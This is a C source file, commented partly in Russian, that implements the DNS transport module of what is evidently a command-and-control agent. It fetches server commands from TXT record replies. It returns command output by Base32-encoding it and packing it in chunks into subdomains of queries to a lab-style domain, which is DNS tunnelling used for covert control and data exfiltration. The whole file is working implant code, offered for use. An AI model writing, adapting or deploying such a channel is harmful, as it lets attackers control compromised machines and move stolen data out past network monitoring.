#include "config.h"
#include "transport.h"

#include <asm-generic/socket.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int current_sockfd = -1; //SOCKET
static struct sockaddr_in server_addr;

/**
 * @brief Кодирует бинарные данные или строку в Base32 (RFC 4648)
 *
 * @param input Указатель на исходные данные (например, строка результата)
 * @param input_len Длина исходных данных в байтах
 * @param output Буфер для записи Base32-строки (должен быть достаточно большим)
 * @param output_size Максимальный размер буфера output (чтобы не было переполнения)
 *
 * @return Длина полученной Base32-строки (без учета нулевого байта), либо -1 при ошибке
 */
static int encode_base32(const unsigned char* input, size_t input_len, char* output, size_t output_size) {
    // Алфавит Base32 по стандарту RFC 4648 (только заглавные буквы и цифры 2-7)
    static const char b32_alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    
    size_t i = 0; // Индекс чтения из input
    size_t j = 0; // Индекс записи в output

    // Читаем входные данные блоками по 5 байт (40 бит)
    // 40 бит = ровно 8 символов Base32 (8 * 5 = 40)
    while (i < input_len) {
        size_t remaining = input_len - i;
        uint64_t buffer = 0; // Используем 64-битное число для сборки битов
        size_t chunk_size = (remaining >= 5) ? 5 : remaining;

        // 1. Упаковываем до 5 байт в 64-битный буфер
        for (size_t k = 0; k < chunk_size; k++) {
            buffer |= ((uint64_t)input[i + k]) << (32 - k * 8);
        }

        // 2. Вытаскиваем 5-битные куски и превращаем их в символы
        // Количество символов на выходе зависит от того, сколько байт было на входе
        int chars_to_write = 0;
        if (chunk_size == 5) chars_to_write = 8;
        else if (chunk_size == 4) chars_to_write = 7;
        else if (chunk_size == 3) chars_to_write = 5;
        else if (chunk_size == 2) chars_to_write = 4;
        else if (chunk_size == 1) chars_to_write = 2;

        // Проверяем, что в выходном буфере достаточно места (включая место под '\0')
        if (j + chars_to_write >= output_size) {
            return -1; 
        }

        // 3. Записываем символы в выходной буфер
        for (int k = 0; k < chars_to_write; k++) {
            // Берем верхние 5 бит и сдвигаем на нужную позицию
            // 0x1F = маска для 5 бит (00011111)
            uint8_t index = (buffer >> (35 - k * 5)) & 0x1F;
            output[j++] = b32_alphabet[index];
        }

        i += chunk_size;
    }

    // Добавляем нулевой байт в конец строки
    output[j] = '\0';

    return (int)j;
}

/**
 * @brief Функция для сбора dns пакета со всеми необходимыми полями
 *
 * @param qname Буфер в котором хранится доменное имя, чтобы из него сформировать пакет(входной аргумент)
 * @param buffer Буфер в котором хранится сформированный dns пакет(выходной параметр)
 * @param qtype Тип запроса
 *
 * @return Количество размер сформированного пакета 
*/
static int build_dns_query(const char* qname, unsigned char* buffer, size_t max_len_buffer, uint16_t qtype) {
    int offset = 0; //pointer for buffer

    buffer[offset++] = (DNS_ID >> 8) & 0xFF; //ID
    buffer[offset++] = DNS_ID & 0xFF; //ID
    buffer[offset++] = 0x01; //flag
    buffer[offset++] = 0x00; //flag
    uint16_t qdcount = htons(0x01); //qdcount
    memcpy(&buffer[offset], &qdcount, 2);
    offset += 2;
    memset(&buffer[offset], 0, 6);
    offset += 6; 

    //parse qname
    int label_start = 0;
    int i = 0;
    int length;
    while(qname[i] != '\0') {
        if(qname[i] == '.') {
            length = i - label_start;
            if((length >= 63) || ((offset + 1 + length) >= max_len_buffer)) {
                printf("[-/DNS] Error, length is invalid.\n");
                return -1; //+1 for dots
            }

            buffer[offset++] = length;
            memcpy(&buffer[offset], &qname[label_start], length);
            offset += length;

            label_start = (i + 1);
        }
        i++;
    }
    length = i - label_start;
    if(length > 0) {
        if((length > 63) || ((offset + 1 + length)>= max_len_buffer)) {
            printf("[-/DNS] Error, length is invalid.\n");
            return -1;
        }
        buffer[offset++] = length;
        memcpy(&buffer[offset], &qname[label_start], length);
        offset += length;
    }
    buffer[offset++] = '\0';

    //qtype and qclass
    if((offset + 4) < max_len_buffer) {    
        uint16_t qtype_net = htons(qtype);
        memcpy(&buffer[offset], &qtype_net, 2);
        offset += 2;

        uint16_t qclass = htons(1);
        memcpy(&buffer[offset], &qclass, 2);
        offset += 2;
    } else {
        printf("[-/DNS] Error, length is invalid.\n");
        return -1;
    }

    return offset;
}

/*
 * @brief Функция для отправки dns пакета
 *
 * @param buffer Буфер в котором хранится отправляемая информация
 * @param length Длина буфера отправляемой информации
 * @param response_buffer Буфер для получаемой информации
 * @param max_len_resp_buf Длина буфера получаемой информации
 *
 * @return Длина принятой информации
*/
int send_dns_packet(const unsigned char* buffer, int length, unsigned char* response_buffer, int max_len_resp_buf) {
    int result = sendto(current_sockfd, buffer, length, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if(result == -1) {
        printf("[-/DNS] Error sendto.\n");
        return -1;
    }

    result = 0;
    result = recvfrom(current_sockfd, response_buffer, max_len_resp_buf, 0, NULL, NULL);
    if(result == -1) {
        printf("[-/DNS] Error recvfrom.\n");
    }

    return result;
}

static int send_chank_and_wait(const char* qname) {
    unsigned char buffer[512];
    unsigned char response[512];

    int dns_packet_len = build_dns_query(qname, buffer, sizeof(buffer), 16);
    if(dns_packet_len == -1) {
        return -1;
    }

    for(int i = 0; i < 3; i++) {
        int response_len = send_dns_packet(buffer, dns_packet_len, response, sizeof(response));
        printf("[DEBUG] %s\n", response);
        if(response_len > 0 && strstr((char*)response, "OK") != NULL) {
            return 0;
        }
    }
    
    printf("[-/DNS] Error, timeout.\n");
    return -1;
}

/**
 * @brief Функция для инициализации сокета для dns
 *
 * @return При успехе - 0, иначе - 1
*/
static int dns_init(void) {
    current_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(current_sockfd == -1) {
        printf("[-/DNS] Error create socket.\n");
        return 1;
    }
    
    //timeout
    struct timeval tv = {
        .tv_sec = 2,
        .tv_usec = 0
    };
    int result = setsockopt(current_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if(result == -1) {
        close(current_sockfd);
        printf("[-/DNS] Error setcoketopt.\n");
        return -1;
    }

    //filling server_addr
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_port = htons(53);
    server_addr.sin_family = AF_INET;
    
    if(inet_pton(AF_INET, SERVER_IP/*from config.h*/, &server_addr.sin_addr) <= 0) {
        printf("[-/DNS] Error server_addr.\n");
        close(current_sockfd);
        return 1;
    }

    return 0;
}

/**
 * @return В случае успеха - 0, 1 - задач нет, иначе - -1
*/
static int dns_get_command(/*[OUT]*/char* command, /*[OUT]*/char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
    //формирование данных для отправки
    char qname[21] = "home.tun.example.lab\0";
    size_t max_len_buffer = 512;
    unsigned char buffer[max_len_buffer]; //dns packet
    uint16_t qtype = 16;

    int ans_offset = build_dns_query(qname, buffer, max_len_buffer, qtype);
    if(ans_offset == -1) {
        printf("[-/DNS] Error build dns packet.\n");
        return -1;
    }
    
    unsigned char response_buffer[max_len_buffer];
    int result = send_dns_packet(buffer, ans_offset, response_buffer, max_len_buffer);
    if(result == -1) {
        printf("[-/DNS] Error send dns packet to server.\n");
        return -1;
    }
    //skip service byte
    ans_offset += 13; //NAME(+=2), TYPE(+=2), CLASS(+=2), TTL(+=4), RDLENGTH(+=2), strlen in RDATA(+=1)
    if(result < ans_offset + 4) {
        printf("[-/DNS] Error length answer buffer.\n");
        return -1;
    }
    char* answer = (char*)&response_buffer[ans_offset];

    if(strncmp(answer, "null", 4) == 0) {
        printf("[+/DNS] Задач для выполнения нет.\n");
        return 1;
    }

    //parse task_id
    char* first_pipe = strchr(answer, '|');
    if(first_pipe == NULL) {
        printf("[-/DNS] Error parse task_id.\n");
        return -1;
    }
    size_t len_task_id = first_pipe - answer;
    if((int)len_task_id >= max_len_task_id) {
        printf("[-/DNS] Error, length task_id very long.\n");
        return -1;
    }
    memcpy(task_id, answer, len_task_id);
    task_id[len_task_id] = '\0';

    //parse command
    char* second_pipe = strchr(&answer[len_task_id + 1], '|');
    if(second_pipe == NULL) {
        printf("[-/DNS] Error parse command.\n");
        return -1;
    }
    size_t len_command = second_pipe - first_pipe - 1;
    if((int)len_command >= max_len_command) {
        printf("[-/DNS] Error, command very long.\n");
        return -1;
    }
    memcpy(command, first_pipe + 1, len_command);
    command[len_command] = '\0';

    printf("[+/DNS] Command from server: %s\n", command);
    return 0;
} 

static int dns_send_result(char* task_id, char* result) {
    if(strlen(result) >= 2000) {
        printf("[-/DNS] Very long result.\n");
        return -1;
    }

    char base32_result[2000]; //buffer for string base32
    int b32_len = encode_base32((const unsigned char*)result, strlen(result), base32_result, sizeof(base32_result));
   
    int chunk_size = 30;
    int offset = 0;
    int part_num = 1;
    char qname[256] = {0};

    while(offset < b32_len) {
        int current_chunk_len = ((b32_len - offset) >= chunk_size) ? chunk_size : (b32_len - offset);

        char chunk[64] = {0};
        memcpy(chunk, &base32_result[offset], current_chunk_len);
        chunk[current_chunk_len] = '\0';

        if((offset + current_chunk_len) >= b32_len) {
            snprintf(qname, sizeof(qname), "%s.end.%s.r.tun.example.lab", chunk, task_id);
        } else {
            snprintf(qname, sizeof(qname), "%s.%02d.%s.r.tun.example.lab", chunk, part_num, task_id);
        }
        
        if(send_chank_and_wait(qname) == -1) {
            printf("[-/DNS] Error sending chunk.\n");
            return -1;    
        }
        
        offset += current_chunk_len;
        part_num++;
    }

    return 0;
}

void dns_cleanup(void) {
    close(current_sockfd);
}

//export module
TransportModule dns_transport = {
    .name = "DNS",
    .init = dns_init,
    .get_command = dns_get_command,
    .send_result = dns_send_result,
    .cleanup = dns_cleanup
};
